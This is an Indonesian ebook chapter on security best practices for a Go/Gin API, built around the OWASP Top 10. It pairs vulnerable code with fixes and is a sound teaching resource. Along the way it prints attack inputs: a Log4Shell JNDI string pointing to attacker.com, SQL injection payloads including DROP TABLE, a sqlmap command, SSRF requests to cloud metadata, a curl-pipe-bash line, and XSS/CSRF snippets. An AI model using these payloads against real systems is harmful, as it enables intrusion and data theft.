# Bab 20: Security Best Practices — Melindungi Aplikasi dari Ancaman Dunia Nyata

## Kenapa Bab Ini Penting?

Ini **bab terakhir** dari seluruh ebook ini. Dan bukan kebetulan security ada di akhir — bukan karena kurang penting, tapi karena security **membutuhkan pemahaman dari SEMUA bab sebelumnya**. Kamu butuh paham Go (Bab 3-4), API (Bab 5), database (Bab 6), authentication (Bab 7), Docker (Bab 11), CI/CD (Bab 12), cloud (Bab 13), Nginx (Bab 14), monitoring (Bab 15), Kubernetes (Bab 16) — semuanya punya **aspek security** yang harus dijaga.

Security bukan fitur yang kamu tambahin di akhir project. **Security is not a feature, it's a requirement.** Ini bukan nice-to-have. Ini MUST-have. Satu vulnerability bisa menghancurkan bisnis, reputasi, dan karier.

```
Sebelum bab ini:
- Task Manager API sudah jalan dan deployed
- Punya auth, RBAC, rate limiting
- Tapi belum di-audit security-nya secara menyeluruh
- Belum paham attack vectors dan prevention

Setelah bab ini:
- Paham OWASP Top 10 dan cara prevent di Go
- Bisa audit kode sendiri untuk security vulnerabilities
- Paham SQL injection, XSS, CSRF, SSRF — dan cara mencegahnya
- Implement security headers, CORS, HTTPS
- Paham secret management, dependency security
- Docker dan Kubernetes security hardening
- Security di CI/CD pipeline (SAST, DAST, SCA)
- Incident response plan
- Production-ready security checklist
- SIAP deploy dengan confidence
```

> **Analogi gampang:** Bayangin kamu bangun rumah mewah. Foundation kuat, desain bagus, interior cakep. Tapi pintunya ga dikunci. Jendelanya ga ada terali. Ga ada alarm. Ga ada CCTV. Semua orang bisa masuk dan ambil apa aja. Itulah aplikasi tanpa security — secakep apapun arsitekturnya, kalau ga aman, semua usaha sia-sia. Security itu kayak: kunci pintu (authentication), alarm (monitoring), CCTV (logging), brankas (encryption), satpam (firewall), pagar (network policy). Setiap layer punya peran.

---

## 20.1 Kenapa Security Penting — Data Breach = End of Business

### Real Incidents yang Harus Kamu Tau

Ini bukan cerita fiksi. Ini kejadian nyata:

#### 1. Equifax (2017) — 147 Juta Data Bocor

```
Apa yang terjadi:
- Apache Struts vulnerability (CVE-2017-5638)
- Patch sudah tersedia SEBELUM attack
- Equifax ga update dependency selama BERBULAN-BULAN
- Hacker masuk, ambil 147 juta Social Security Numbers

Dampak:
- Denda $700 juta
- CEO, CTO, CISO resign
- Stock drop 35%
- Reputasi hancur

Pelajaran:
- UPDATE DEPENDENCIES
- Vulnerability scanning itu wajib
- Patch management = nyawa
```

#### 2. Facebook/Cambridge Analytica (2018)

```
Apa yang terjadi:
- Third-party app bisa akses data 87 juta user
- API terlalu permissive (over-scoping)
- Ga ada proper authorization check

Dampak:
- Denda $5 miliar dari FTC
- Stock drop $120 miliar dalam 10 hari
- Public trust hancur
- Congress hearing

Pelajaran:
- Least privilege — kasih akses MINIMUM yang dibutuhkan
- API authorization harus granular
- Audit third-party access
```

#### 3. Tokopedia (2020) — 91 Juta Data User

```
Apa yang terjadi:
- Database bocor, 91 juta data user dijual di dark web
- Data: email, nama, hash password, tanggal lahir, nomor HP

Dampak:
- User trust rusak
- Harus force reset password semua user
- Regulatory scrutiny
- Ini di Indonesia — relevan banget buat kita

Pelajaran:
- Password hashing HARUS kuat (bcrypt/argon2, bukan MD5)
- Database access harus strictly controlled
- Encrypt data at rest
- Monitor suspicious database access
```

#### 4. Log4Shell (2021) — The Worst Vulnerability Ever

```
Apa yang terjadi:
- Log4j (Java logging library) punya remote code execution vulnerability
- Cukup kirim string ${jndi:ldap://attacker.com/exploit} di log
- Hampir SEMUA Java application vulnerable
- Minecraft, iCloud, Twitter, Amazon — semua kena

Dampak:
- CVE-2021-44228 — CVSS score 10.0 (maximum)
- Panic global selama berminggu-minggu
- Supply chain attack nightmare

Pelajaran:
- Dependencies bisa jadi attack vector
- Supply chain security matters
- Minimal dependencies = minimal attack surface
```

### Security Mindset

```
Developer biasa berpikir:
"Gimana bikin fitur ini JALAN?"

Security-aware developer berpikir:
"Gimana fitur ini bisa DISALAHGUNAKAN?"
"Apa yang terjadi kalau input-nya unexpected?"
"Siapa yang SEHARUSNYA bisa akses ini?"
"Apa yang terjadi kalau dependency ini compromised?"
"Data apa yang bocor kalau server ini diretas?"
```

> **"Security is not a product, but a process."** — Bruce Schneier

---

## 20.2 OWASP Top 10 — 10 Kelemahan Paling Berbahaya

[OWASP](https://owasp.org/) (Open Worldwide Application Security Project) merilis daftar **10 risiko keamanan web application paling critical** setiap beberapa tahun. Ini standar industri.

```
OWASP Top 10 (2021):
━━━━━━━━━━━━━━━━━━━

A01: Broken Access Control          ← Paling berbahaya #1
A02: Cryptographic Failures         ← Enkripsi salah/lemah
A03: Injection                      ← SQL injection, command injection
A04: Insecure Design                ← Desain arsitektur yang lemah
A05: Security Misconfiguration      ← Default config, debug mode
A06: Vulnerable Components          ← Dependency bermasalah
A07: Authentication Failures        ← Login bypass, weak password
A08: Software & Data Integrity      ← Supply chain, unsigned updates
A09: Logging & Monitoring Failures  ← Ga tau kalau di-hack
A10: Server-Side Request Forgery    ← SSRF — akses internal via server
```

### A01: Broken Access Control

**Deskripsi:** User bisa melakukan hal yang SEHARUSNYA ga boleh — akses data orang lain, modify resource yang bukan miliknya, escalate privilege.

```go
// VULNERABLE: Task GetByID tanpa authorization check
// Siapa aja yang login bisa lihat task siapa aja
func (h *TaskHandler) GetByID(c *gin.Context) {
    id, _ := strconv.ParseUint(c.Param("id"), 10, 64)

    // BUG: ga cek apakah user ini punya akses ke task ini!
    task, err := h.taskService.GetByID(uint(id))
    if err != nil {
        response.Error(c, http.StatusNotFound, "Task not found")
        return
    }

    response.Success(c, http.StatusOK, "Task detail", task)
}

// SECURE: Cek ownership sebelum return data
func (h *TaskHandler) GetByID(c *gin.Context) {
    userID := c.GetUint("userID")
    userRole, _ := c.Get("role")
    id, _ := strconv.ParseUint(c.Param("id"), 10, 64)

    task, err := h.taskService.GetByID(uint(id))
    if err != nil {
        response.Error(c, http.StatusNotFound, "Task not found")
        return
    }

    // Cek: user adalah board owner, task assignee, atau admin
    board, _ := h.boardService.GetByID(task.BoardID)
    isOwner := board.OwnerID == userID
    isAssignee := task.AssigneeID != nil && *task.AssigneeID == userID
    isAdmin := userRole.(model.Role) == model.RoleAdmin

    if !isOwner && !isAssignee && !isAdmin {
        response.Error(c, http.StatusForbidden, "Access denied")
        return
    }

    response.Success(c, http.StatusOK, "Task detail", task)
}
```

**Contoh serangan IDOR (Insecure Direct Object Reference):**

```bash
# User A login, punya task ID 5
# User A coba akses task ID 999 (punya User B)
curl -H "Authorization: Bearer <token_user_a>" \
  http://api.example.com/api/v1/tasks/999

# Kalau ga ada access check, User A bisa lihat task User B!
# Ini namanya IDOR — tinggal ganti ID di URL
```

**Prevention:**
- Selalu cek ownership sebelum return/modify data
- Deny by default — harus explicitly grant access
- Gunakan middleware untuk access control
- Test dengan multiple user accounts

---

### A02: Cryptographic Failures

**Deskripsi:** Menggunakan encryption yang lemah, ga encrypt data sensitif, atau salah implementasi crypto.

```go
// VULNERABLE: MD5 untuk password hashing
import "crypto/md5"

func hashPassword(password string) string {
    hash := md5.Sum([]byte(password))
    return fmt.Sprintf("%x", hash)
    // MD5 bisa di-crack dalam DETIK pakai rainbow table
}

// VULNERABLE: Hardcoded secret key
const jwtSecret = "mysecretkey123"

// VULNERABLE: Encrypt data pakai DES (outdated)
import "crypto/des"

// VULNERABLE: Transmit password tanpa HTTPS
// http://api.example.com/login  ← password dikirim plain text!
```

```go
// SECURE: Bcrypt untuk password hashing (sudah kita implementasi!)
import "golang.org/x/crypto/bcrypt"

func (u *User) HashPassword() error {
    hashed, err := bcrypt.GenerateFromPassword(
        []byte(u.Password),
        bcrypt.DefaultCost, // cost 10 — butuh ~100ms untuk hash
    )
    if err != nil {
        return err
    }
    u.Password = string(hashed)
    return nil
}

// SECURE: Secret dari environment variable
jwtSecret := os.Getenv("JWT_SECRET")
if len(jwtSecret) < 32 {
    log.Fatal("JWT_SECRET must be at least 32 characters")
}

// SECURE: AES-256-GCM untuk encryption
import "crypto/aes"
import "crypto/cipher"

func encrypt(plaintext []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    aesGCM, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    nonce := make([]byte, aesGCM.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }
    return aesGCM.Seal(nonce, nonce, plaintext, nil), nil
}
```

**Prevention:**
- Pakai bcrypt/argon2 untuk password (BUKAN MD5/SHA)
- AES-256-GCM untuk data encryption
- TLS 1.2+ untuk data in transit
- RSA-2048+ atau Ed25519 untuk asymmetric crypto
- Jangan bikin crypto sendiri — pakai library yang proven

---

### A03: Injection (SQL Injection)

**Deskripsi:** Attacker memasukkan malicious code (SQL, command, LDAP) melalui input yang tidak di-sanitize.

```go
// VULNERABLE: String concatenation di SQL query
func (r *UserRepository) FindByEmailUnsafe(email string) (*model.User, error) {
    var user model.User
    // BAHAYA! User bisa input: ' OR '1'='1' --
    query := "SELECT * FROM users WHERE email = '" + email + "'"
    err := r.db.Raw(query).Scan(&user).Error
    return &user, err
}

// Attack: email = "' OR '1'='1' --"
// Query jadi: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// Ini return SEMUA user!

// Attack lebih parah: email = "'; DROP TABLE users; --"
// Query jadi: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
// TABEL USERS DIHAPUS!
```

```go
// SECURE: Parameterized query (GORM default behavior)
func (r *UserRepository) FindByEmail(email string) (*model.User, error) {
    var user model.User
    // GORM otomatis pakai parameterized query
    err := r.db.Where("email = ?", email).First(&user).Error
    return &user, err
}
// Query: SELECT * FROM users WHERE email = $1
// Parameter: ["' OR '1'='1' --"]
// Database treat parameter sebagai DATA, bukan SQL code!

// SECURE: Raw query dengan parameter (kalau terpaksa)
func (r *UserRepository) SearchUsersRaw(name string) ([]model.User, error) {
    var users []model.User
    err := r.db.Raw("SELECT * FROM users WHERE name ILIKE ?", "%"+name+"%").Scan(&users).Error
    return users, err
}
```

**Prevention:**
- SELALU pakai parameterized queries
- GORM sudah safe by default — jangan bypass dengan string concatenation
- Kalau pakai Raw(), tetap gunakan `?` placeholder
- Validate input type dan format sebelum query

> **Task Manager kita:** Review `internal/repository/*.go` — semua query sudah pakai GORM method yang parameterized. Ini AMAN. Yang bahaya adalah kalau kita nulis raw SQL dengan string concatenation.

---

### A04: Insecure Design

**Deskripsi:** Masalah di level arsitektur/design, bukan bug di code. Security ga dipikirkan dari awal.

```go
// INSECURE DESIGN: Password reset tanpa proper verification
func (h *AuthHandler) ResetPassword(c *gin.Context) {
    var req struct {
        Email       string `json:"email"`
        NewPassword string `json:"new_password"`
    }
    c.ShouldBindJSON(&req)

    // BUG: Siapa aja bisa reset password siapa aja!
    // Ga ada verification (OTP, email link, security question)
    user, _ := h.userService.FindByEmail(req.Email)
    user.Password = req.NewPassword
    user.HashPassword()
    h.userService.Update(user)

    response.Success(c, http.StatusOK, "Password reset", nil)
}
```

```go
// SECURE DESIGN: Password reset dengan OTP via email
func (h *AuthHandler) RequestPasswordReset(c *gin.Context) {
    var req struct {
        Email string `json:"email" binding:"required,email"`
    }
    if err := c.ShouldBindJSON(&req); err != nil {
        response.Error(c, http.StatusBadRequest, err.Error())
        return
    }

    // Step 1: Generate token, simpan di database (with expiry)
    token, err := h.authService.CreatePasswordResetToken(req.Email)
    if err != nil {
        // Jangan kasih tau apakah email ada atau tidak (prevent enumeration)
        response.Success(c, http.StatusOK, "If email exists, reset link sent", nil)
        return
    }

    // Step 2: Kirim email dengan reset link
    resetLink := fmt.Sprintf("https://app.example.com/reset?token=%s", token)
    h.emailService.SendPasswordReset(req.Email, resetLink)

    response.Success(c, http.StatusOK, "If email exists, reset link sent", nil)
}

func (h *AuthHandler) ConfirmPasswordReset(c *gin.Context) {
    var req struct {
        Token       string `json:"token" binding:"required"`
        NewPassword string `json:"new_password" binding:"required,min=8"`
    }
    if err := c.ShouldBindJSON(&req); err != nil {
        response.Error(c, http.StatusBadRequest, err.Error())
        return
    }

    // Step 3: Validate token, check expiry, reset password
    if err := h.authService.ResetPasswordWithToken(req.Token, req.NewPassword); err != nil {
        response.Error(c, http.StatusBadRequest, "Invalid or expired token")
        return
    }

    // Step 4: Invalidate all existing sessions/tokens
    // Step 5: Send confirmation email

    response.Success(c, http.StatusOK, "Password reset successful", nil)
}
```

**Prevention:**
- Threat modeling di awal project
- Abuse case analysis — "gimana fitur ini bisa disalahgunakan?"
- Security review di design phase, bukan setelah coding
- Fail securely — kalau error, default ke denied

---

### A05: Security Misconfiguration

**Deskripsi:** Default settings, debug mode di production, unnecessary features enabled, missing security headers.

```go
// VULNERABLE: Debug mode di production
func main() {
    // Gin default = debug mode (log semua request, expose info)
    r := gin.Default()

    // Ga set trusted proxies
    // Ga disable debug endpoints
    // Default error messages terlalu detail
}

// SECURE: Proper configuration per environment
func main() {
    cfg := config.Load()

    if cfg.Env == "production" {
        gin.SetMode(gin.ReleaseMode) // Disable debug info
    }

    r := gin.New() // Tanpa default middleware

    // Custom recovery yang ga expose stack trace
    r.Use(gin.CustomRecovery(func(c *gin.Context, recovered interface{}) {
        // Log full error internally
        log.Printf("PANIC recovered: %v\nStack: %s", recovered, debug.Stack())

        // Return generic message ke client
        response.Error(c, http.StatusInternalServerError, "Internal server error")
    }))

    // Set trusted proxies (penting kalau di belakang load balancer)
    r.SetTrustedProxies([]string{"10.0.0.0/8", "172.16.0.0/12"})

    // Disable unused methods
    r.HandleMethodNotAllowed = true
}
```

```yaml
# VULNERABLE: docker-compose.yml
services:
  db:
    image: postgres:16
    ports:
      - "5432:5432"     # Database exposed ke public!
    environment:
      POSTGRES_PASSWORD: "password123"  # Weak password!
    # No SSL, no resource limits

# SECURE: docker-compose.yml
services:
  db:
    image: postgres:16-alpine
    ports:
      - "127.0.0.1:5432:5432"  # Hanya localhost bisa akses
    environment:
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password  # Dari Docker secret
    volumes:
      - ./pg_hba.conf:/etc/postgresql/pg_hba.conf  # Restrict connections
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 512M
    command: >
      postgres
        -c ssl=on
        -c ssl_cert_file=/certs/server.crt
        -c ssl_key_file=/certs/server.key
```

**Prevention:**
- Production HARUS pakai release mode
- Disable debug/stack trace di responses
- Set trusted proxies
- Database jangan expose ke public
- Review semua default configurations

---

### A06: Vulnerable and Outdated Components

**Deskripsi:** Pakai library/framework yang punya known vulnerabilities.

```bash
# Check Go dependencies for vulnerabilities
go install golang.org/x/vuln/cmd/govulncheck@latest
govulncheck ./...

# Output contoh:
# Vulnerability #1: GO-2024-2887
#   net/http: Denial of service via HTTP/2
#   Found in: stdlib@go1.21.0
#   Fixed in: stdlib@go1.21.11
```

```go
// go.mod — check dependency versions
module github.com/irzan-aldi/task-manager

go 1.22

require (
    github.com/gin-gonic/gin v1.10.0
    github.com/golang-jwt/jwt/v5 v5.2.1
    gorm.io/gorm v1.25.10
    gorm.io/driver/postgres v1.5.9
    github.com/redis/go-redis/v9 v9.5.3
    golang.org/x/crypto v0.24.0
)
```

```bash
# Update semua dependency ke latest patch
go get -u ./...

# Update specific dependency
go get -u github.com/gin-gonic/gin

# Tidy — remove unused dependencies
go mod tidy

# Verify checksum integrity
go mod verify
```

**Prevention:**
- Jalankan `govulncheck` di CI/CD pipeline
- Update dependency secara berkala
- Minimal dependencies — jangan pakai library untuk hal simple
- Monitor security advisories (GitHub Dependabot)
- Pin dependency versions, tapi review updates regularly

---

### A07: Identification and Authentication Failures

**Deskripsi:** Weak password policy, credential stuffing, brute force, session management yang buruk.

```go
// VULNERABLE: Ga ada brute force protection
func (h *AuthHandler) Login(c *gin.Context) {
    var req model.LoginRequest
    c.ShouldBindJSON(&req)

    // Attacker bisa coba 100.000 password per menit!
    tokens, err := h.authService.Login(req)
    if err != nil {
        response.Error(c, http.StatusUnauthorized, err.Error())
        return
    }
    response.Success(c, http.StatusOK, "Login successful", tokens)
}

// VULNERABLE: Error message yang leak info
func (s *AuthService) Login(req model.LoginRequest) (*TokenPair, error) {
    user, err := s.userRepo.FindByEmail(req.Email)
    if err != nil {
        return nil, errors.New("email not found")     // LEAK: attacker tau email ga ada
    }
    if !user.CheckPassword(req.Password) {
        return nil, errors.New("wrong password")       // LEAK: attacker tau email valid
    }
    return s.generateTokenPair(user)
}
```

```go
// SECURE: Generic error message + brute force protection
func (s *AuthService) Login(req model.LoginRequest) (*TokenPair, error) {
    user, err := s.userRepo.FindByEmail(req.Email)
    if err != nil {
        // Generic message — ga kasih tau apakah email ada atau tidak
        return nil, errors.New("invalid email or password")
    }
    if !user.CheckPassword(req.Password) {
        return nil, errors.New("invalid email or password")
    }
    return s.generateTokenPair(user)
}

// SECURE: Login rate limiter per email
func LoginRateLimiter(redisClient *redis.Client) gin.HandlerFunc {
    return func(c *gin.Context) {
        var req struct {
            Email string `json:"email"`
        }
        // Peek at body without consuming it
        body, _ := io.ReadAll(c.Request.Body)
        c.Request.Body = io.NopCloser(bytes.NewBuffer(body))
        json.Unmarshal(body, &req)

        if req.Email == "" {
            c.Next()
            return
        }

        ctx := context.Background()
        key := fmt.Sprintf("login_attempts:%s", req.Email)

        count, _ := redisClient.Get(ctx, key).Int()
        if count >= 5 {
            // 5 failed attempts — lock for 15 minutes
            ttl, _ := redisClient.TTL(ctx, key).Result()
            response.Error(c, http.StatusTooManyRequests,
                fmt.Sprintf("Account locked. Try again in %d minutes", int(ttl.Minutes())+1))
            c.Abort()
            return
        }

        c.Next()

        // Kalau login gagal, increment counter
        if c.Writer.Status() == http.StatusUnauthorized {
            redisClient.Incr(ctx, key)
            redisClient.Expire(ctx, key, 15*time.Minute)
        } else {
            // Login berhasil — reset counter
            redisClient.Del(ctx, key)
        }
    }
}
```

**Prevention:**
- Generic error messages untuk login
- Rate limiting per IP DAN per email
- Account lockout setelah N failed attempts
- Password strength validation (min 8 chars, mixed case, number)
- MFA (Multi-Factor Authentication)

> **Review Task Manager kita:** `internal/service/auth.go` sudah pakai generic error "invalid email or password". Bagus! Tapi belum ada login-specific rate limiting — rate limiter kita hanya per IP secara global.

---

### A08: Software and Data Integrity Failures

**Deskripsi:** Software updates, CI/CD pipeline, dan data tanpa integrity verification. Supply chain attacks.

```yaml
# VULNERABLE: CI/CD pipeline tanpa verification
steps:
  - name: Build
    run: |
      # Download random script dari internet dan execute
      curl -sSL https://some-random-site.com/install.sh | bash

      # Pull image tanpa verify digest
      docker pull myregistry/myapp:latest

# SECURE: Verify integrity
steps:
  - name: Build
    run: |
      # Pin action versions dengan SHA, bukan tag
      # uses: actions/checkout@v4  ← BISA diganti attacker
      # uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  ← SHA = immutable

      # Verify Go module checksums
      go mod verify

      # Pull image dengan digest
      docker pull myregistry/myapp@sha256:abc123...
```

```go
// SECURE: Verify webhook signatures (GitHub)
func VerifyGitHubWebhook(payload []byte, signature string, secret string) bool {
    mac := hmac.New(sha256.New, []byte(secret))
    mac.Write(payload)
    expectedMAC := mac.Sum(nil)
    expectedSignature := "sha256=" + hex.EncodeToString(expectedMAC)
    return hmac.Equal([]byte(signature), []byte(expectedSignature))
}
```

**Prevention:**
- Pin dependency versions (go.sum sudah handle ini)
- Verify checksums (`go mod verify`)
- Sign artifacts dan verify signatures
- Pin CI/CD action versions ke SHA
- Code review untuk semua changes

---

### A09: Security Logging and Monitoring Failures

**Deskripsi:** Ga tau kalau sedang di-hack karena ga ada logging atau monitoring yang proper.

```go
// VULNERABLE: No security logging
func (h *AuthHandler) Login(c *gin.Context) {
    var req model.LoginRequest
    c.ShouldBindJSON(&req)
    tokens, err := h.authService.Login(req)
    if err != nil {
        // Ga ada log! Attacker bisa brute force tanpa ketahuan
        response.Error(c, http.StatusUnauthorized, err.Error())
        return
    }
    response.Success(c, http.StatusOK, "Login successful", tokens)
}
```

```go
// SECURE: Comprehensive security logging
func (h *AuthHandler) Login(c *gin.Context) {
    var req model.LoginRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        response.Error(c, http.StatusBadRequest, err.Error())
        return
    }

    tokens, err := h.authService.Login(req)
    if err != nil {
        // Log failed login attempt
        log.Printf("[SECURITY] Login failed | email=%s | ip=%s | user_agent=%s | reason=%s",
            req.Email,
            c.ClientIP(),
            c.GetHeader("User-Agent"),
            err.Error(),
        )

        response.Error(c, http.StatusUnauthorized, "Invalid email or password")
        return
    }

    // Log successful login
    log.Printf("[SECURITY] Login success | email=%s | ip=%s | user_agent=%s",
        req.Email,
        c.ClientIP(),
        c.GetHeader("User-Agent"),
    )

    response.Success(c, http.StatusOK, "Login successful", tokens)
}
```

**Yang HARUS di-log:**
- Login success/failure (dengan IP, user agent)
- Password reset requests
- Privilege escalation attempts
- Access denied events
- Admin actions (delete user, change role)
- Input validation failures (bisa indikasi scanning)

**Yang JANGAN di-log:**
- Password (plain text!)
- JWT tokens
- Credit card numbers
- Personal data (sesuai GDPR/privacy laws)

**Prevention:**
- Log semua security events
- Set up alerting (Grafana/PagerDuty) untuk suspicious activity
- Centralized logging (ELK, Loki)
- Log retention policy (minimal 90 hari)
- Regular log review

---

### A10: Server-Side Request Forgery (SSRF)

**Deskripsi:** Attacker bisa membuat server kita mengirim request ke internal resources yang seharusnya ga bisa diakses dari luar.

```go
// VULNERABLE: User bisa input URL apa aja
func (h *Handler) FetchURL(c *gin.Context) {
    url := c.Query("url")

    // Attacker input: url=http://169.254.169.254/latest/meta-data/
    // Ini AWS metadata endpoint — bisa ambil IAM credentials!

    // Attacker input: url=http://localhost:5432/
    // Akses internal database!

    resp, err := http.Get(url)
    if err != nil {
        response.Error(c, http.StatusBadRequest, "Failed to fetch")
        return
    }
    defer resp.Body.Close()

    body, _ := io.ReadAll(resp.Body)
    c.Data(http.StatusOK, "text/plain", body)
}
```

```go
// SECURE: Validate dan whitelist URLs
import "net"

func isAllowedURL(rawURL string) bool {
    parsedURL, err := url.Parse(rawURL)
    if err != nil {
        return false
    }

    // Hanya izinkan HTTPS
    if parsedURL.Scheme != "https" {
        return false
    }

    // Resolve hostname ke IP
    host := parsedURL.Hostname()
    ips, err := net.LookupIP(host)
    if err != nil {
        return false
    }

    for _, ip := range ips {
        // Block private/internal IPs
        if ip.IsLoopback() ||       // 127.0.0.0/8
           ip.IsPrivate() ||        // 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
           ip.IsLinkLocalUnicast() { // 169.254.0.0/16 (AWS metadata!)
            return false
        }
    }

    // Optional: whitelist specific domains
    allowedDomains := []string{"api.github.com", "api.stripe.com"}
    for _, domain := range allowedDomains {
        if host == domain {
            return true
        }
    }

    return false
}

func (h *Handler) FetchURL(c *gin.Context) {
    rawURL := c.Query("url")

    if !isAllowedURL(rawURL) {
        response.Error(c, http.StatusBadRequest, "URL not allowed")
        return
    }

    // Tambah timeout untuk prevent slow-loris
    client := &http.Client{
        Timeout: 10 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if len(via) >= 3 {
                return errors.New("too many redirects")
            }
            // Re-validate redirected URL
            if !isAllowedURL(req.URL.String()) {
                return errors.New("redirect to disallowed URL")
            }
            return nil
        },
    }

    resp, err := client.Get(rawURL)
    if err != nil {
        response.Error(c, http.StatusBadRequest, "Failed to fetch")
        return
    }
    defer resp.Body.Close()

    // Limit response size
    body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // Max 1MB
    c.Data(http.StatusOK, resp.Header.Get("Content-Type"), body)
}
```

**Prevention:**
- Jangan terima arbitrary URLs dari user
- Block requests ke internal IPs (127.0.0.1, 10.x, 172.x, 192.168.x, 169.254.x)
- Whitelist allowed domains
- Disable HTTP redirects atau re-validate after redirect
- Network segmentation (firewall rules)
- Di AWS: IMDSv2 (Instance Metadata Service v2) require token

---

## 20.3 SQL Injection Prevention — Deep Dive

SQL injection itu **serangan paling klasik** tapi masih jadi top 3 OWASP sampai sekarang. Di Go, kita pakai GORM yang sudah safe by default. Tapi kamu tetap harus paham kapan bisa vulnerable.

### GORM — Safe by Default

```go
// SAFE: Semua method GORM ini pakai parameterized queries
db.Where("email = ?", email).First(&user)          // Safe
db.Find(&users, "name LIKE ?", "%"+name+"%")        // Safe
db.Create(&user)                                     // Safe
db.Save(&user)                                       // Safe
db.Delete(&user, id)                                 // Safe
db.First(&user, id)                                  // Safe (numeric ID)
db.Preload("Tasks").Find(&boards)                    // Safe

// DANGER ZONE: Raw query dengan string concatenation
db.Raw("SELECT * FROM users WHERE name = '" + name + "'")  // VULNERABLE!
db.Exec("DELETE FROM users WHERE id = " + id)               // VULNERABLE!

// SAFE: Raw query dengan parameter
db.Raw("SELECT * FROM users WHERE name = ?", name)          // Safe
db.Exec("DELETE FROM users WHERE id = ?", id)               // Safe
```

### GORM First() Gotcha

```go
// PERHATIAN: db.First(&user, input) bisa vulnerable kalau input bukan numeric!
// Kalau input = string, GORM treat sebagai inline condition

// Safe — input integer:
db.First(&user, 42)
// SELECT * FROM users WHERE id = 42

// DANGER — input string:
input := c.Param("id") // bisa "1 OR 1=1"
db.First(&user, input) // GORM bisa treat ini sebagai SQL fragment!
// Best practice: selalu parse ke uint dulu
id, err := strconv.ParseUint(c.Param("id"), 10, 64)
if err != nil {
    response.Error(c, http.StatusBadRequest, "Invalid ID")
    return
}
db.First(&user, uint(id)) // Safe — numeric
```

### Testing for SQL Injection

```bash
# Manual testing — coba input ini di field:
' OR '1'='1
'; DROP TABLE users; --
' UNION SELECT null, null, null --
1' AND SLEEP(5) --

# Automated testing dengan sqlmap:
# Install: pip install sqlmap
sqlmap -u "http://localhost:8080/api/v1/users?search=test" \
  --headers="Authorization: Bearer <token>" \
  --level=3 \
  --risk=2 \
  --batch
```

> **Review Task Manager kita:** Semua repository methods (`internal/repository/*.go`) sudah menggunakan GORM parameterized queries. `FindByEmail` pakai `db.Where("email = ?", email)`. `FindByID` pakai `db.First(&user, id)` dengan id berupa `uint` yang sudah di-parse. Ini sudah AMAN.

---

## 20.4 XSS Prevention — Cross-Site Scripting

XSS lebih relevan untuk frontend, tapi sebagai API developer kamu tetap harus aware — terutama kalau ada web dashboard.

### Tipe XSS

```
1. Stored XSS — Malicious script disimpan di database
   Contoh: user nulis task title "<script>alert('hacked')</script>"
   → Setiap orang yang lihat task itu, script-nya jalan

2. Reflected XSS — Script dari URL/input langsung di-render
   Contoh: http://app.com/search?q=<script>steal_cookie()</script>

3. DOM-based XSS — Script manipulasi DOM di client-side
   Contoh: document.innerHTML = location.hash
```

### API-Level Prevention

```go
// Untuk API yang return JSON, XSS risk lebih kecil karena
// browser ga execute script di JSON response.
// Tapi tetap perlu sanitize input!

import "html"

// Sanitize input sebelum simpan ke database
func sanitizeInput(input string) string {
    // HTML encode special characters
    return html.EscapeString(input)
    // "<script>alert('xss')</script>" → "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"
}

// Middleware untuk sanitize semua string input
func SanitizeMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // Set header supaya browser tau ini JSON, bukan HTML
        c.Header("Content-Type", "application/json; charset=utf-8")
        c.Header("X-Content-Type-Options", "nosniff")
        c.Next()
    }
}
```

### Content-Security-Policy Header

```go
// Kalau punya web dashboard, CSP sangat penting
func SecurityHeadersMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // Cegah inline scripts
        c.Header("Content-Security-Policy",
            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'")

        c.Next()
    }
}
```

### Go html/template Auto-Escaping

```go
// Kalau kamu render HTML (web dashboard), pakai html/template
// html/template otomatis escape output!
import "html/template"

// SAFE: auto-escaped
tmpl := template.Must(template.New("task").Parse(`
    <h1>{{.Title}}</h1>
    <p>{{.Description}}</p>
`))
// Input: Title = "<script>alert('xss')</script>"
// Output: <h1>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</h1>

// DANGER: text/template TIDAK escape!
import "text/template" // JANGAN pakai ini untuk HTML!
```

**Prevention:**
- Sanitize input (escape HTML special characters)
- Set `Content-Type: application/json` untuk API responses
- Set `X-Content-Type-Options: nosniff`
- Pakai `Content-Security-Policy` header
- Pakai `html/template` (bukan `text/template`) untuk HTML rendering

---

## 20.5 CSRF Protection — Cross-Site Request Forgery

### Apa Itu CSRF?

```
Skenario:
1. User login ke bank.com → dapat session cookie
2. User buka malicious-site.com di tab lain
3. malicious-site.com punya hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="hacker_account">
     <input type="hidden" name="amount" value="1000000">
   </form>
   <script>document.forms[0].submit()</script>
4. Browser otomatis kirim cookie bank.com → transfer berhasil!
```

### API dengan JWT — CSRF Less Relevant

```
Kabar baiknya:
Task Manager API kita pakai JWT di Authorization header (bukan cookie).
Browser TIDAK otomatis kirim Authorization header.
Jadi CSRF attack ga bisa terjadi secara default.

TAPI — kalau kamu:
- Simpan JWT di cookie → CSRF jadi relevant
- Punya web dashboard yang pakai cookie auth → PERLU CSRF protection
```

### Implementasi CSRF Protection (Untuk Web Dashboard)

```go
import "crypto/rand"

// Generate CSRF token
func generateCSRFToken() (string, error) {
    bytes := make([]byte, 32)
    _, err := rand.Read(bytes)
    if err != nil {
        return "", err
    }
    return base64.URLEncoding.EncodeToString(bytes), nil
}

// CSRF Middleware
func CSRFMiddleware(redisClient *redis.Client) gin.HandlerFunc {
    return func(c *gin.Context) {
        // Skip untuk GET, HEAD, OPTIONS (safe methods)
        if c.Request.Method == "GET" || c.Request.Method == "HEAD" || c.Request.Method == "OPTIONS" {
            // Generate dan set CSRF token
            token, _ := generateCSRFToken()
